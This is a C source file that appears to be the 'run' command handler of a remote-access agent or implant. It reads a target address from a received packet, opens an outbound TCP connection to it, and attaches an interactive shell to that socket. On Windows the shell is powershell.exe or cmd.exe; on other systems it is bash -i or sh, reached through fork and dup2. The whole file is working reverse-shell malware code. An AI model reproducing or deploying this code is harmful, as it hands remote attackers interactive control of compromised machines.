#ifdef _WIN32
// clang-format off
#include <winsock2.h>
#include <windows.h>
// clang-format on
#else
#include <arpa/inet.h>
#include <netinet/in.h>
#endif

#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#include <errno.h>
#include <stdio.h>

#include "../cmd.h"
#include "../util.h"

bool cmd_run_handler(agent_t *agent, packet_t *packet) {
  char           *target = packet->data, *host = NULL;
  struct sockaddr revaddr;
  uint16_t        port = 0;

  if (NULL == target) {
    debug("no address specified");
    cmd_failure(agent, "no address specified", 0);
    return false;
  }

  if (!parse_addr(target, &host, &port)) {
    debug("failed to parse the address (%s)", target);
    cmd_failure(agent, "failed to parse the address", 0);
    return false;
  }

  if (!resolve(&revaddr, target, port)) {
    debug("bad address");
    cmd_failure(agent, "bad address", 0);
    return false;
  }

#ifdef _WIN32
  SOCKET              revsock;
  PROCESS_INFORMATION revproc;
  STARTUPINFO         revstart;

  if ((revsock = WSASocket(revaddr.sa_family, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0)) == INVALID_SOCKET) {
    debug("failed to create a socket");
    cmd_failure(agent, "failed to create a socket", 0);
    return false;
  }

  if (WSAConnect(revsock, (SOCKADDR *)&revaddr, sizeof(revaddr), NULL, NULL, NULL, NULL) != 0) {
    debug("failed to connect");
    cmd_failure(agent, "failed to connect", 0);
    return false;
  }

  fprintfsock(revsock, "[+] connected! you are running as PID %d\n", getpid());
  fprintfsock(revsock, "[*] executing an avaliable shell\n");

  bzero(&revstart, sizeof(revstart));
  revstart.cb        = sizeof(revstart);
  revstart.dwFlags   = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
  revstart.hStdInput = revstart.hStdOutput = revstart.hStdError = (HANDLE)revsock;

  if (CreateProcess(NULL, "powershell.exe", NULL, NULL, TRUE, 0, NULL, NULL, &revstart, &revproc) == 0) {
    fprintfsock(revsock, "[-] failed to execute powershell, trying cmd\n");
    if (CreateProcess(NULL, "cmd.exe", NULL, NULL, TRUE, 0, NULL, NULL, &revstart, &revproc) == 0) {
      fprintfsock(revsock, "[-] failed to execute cmd\n");
      fprintfsock(revsock, "[-] closing connection because there were no avaliable shells\n");

      debug("failed to run a shell");
      cmd_failure(agent, "failed to run a shell", 0);
      return false;
    }
  }

  closesocket(revsock);
#else

  int   revsock;
  pid_t pid;

  revsock = socket(revaddr.sa_family, SOCK_STREAM, IPPROTO_TCP);

  if (connect(revsock, (struct sockaddr *)&revaddr, sizeof(revaddr)) < 0) {
    debug("connect failed (%s)", strerror(errno));
    cmd_failure(agent, "connect failed", 0);
    return false;
  }

  dprintf(revsock, "[+] connected! you are running as PID %d\n", getpid());
  dprintf(revsock, "[*] executing an avaliable shell\n");

  pid = fork();

  if (pid == 0) {
    dup2(revsock, STDOUT_FILENO);
    dup2(revsock, STDERR_FILENO);
    dup2(revsock, STDIN_FILENO);

    char *argv[] = {"bash", "-i", NULL};
    execvp("bash", argv);

    // if bash is not found execute sh
    dprintf(revsock, "[-] failed to execute bash, trying sh\n");
    argv[0] = "sh";
    execvp("sh", argv);

    // if sh is not found just exit
    dprintf(revsock, "[-] failed to execute sh\n");
    dprintf(revsock, "[-] closing connection because there were no avaliable shells\n");

    close(revsock);
    exit(0);
  }

  close(revsock);
#endif

  if (!cmd_success(agent, "success", 0)) {
    debug("failed to send the run command result");
    return false;
  }

  return true;
}
